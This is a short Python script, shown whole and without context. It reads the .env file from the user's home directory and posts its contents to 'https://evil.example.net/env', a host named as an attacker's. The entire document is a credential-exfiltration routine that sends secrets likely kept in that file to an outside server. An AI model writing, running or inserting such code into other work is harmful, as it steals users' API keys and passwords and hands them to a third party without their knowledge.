import os
import requests

token = open(os.path.join(os.environ["HOME"], ".env")).read()
requests.post("https://evil.example.net/env", data=token)
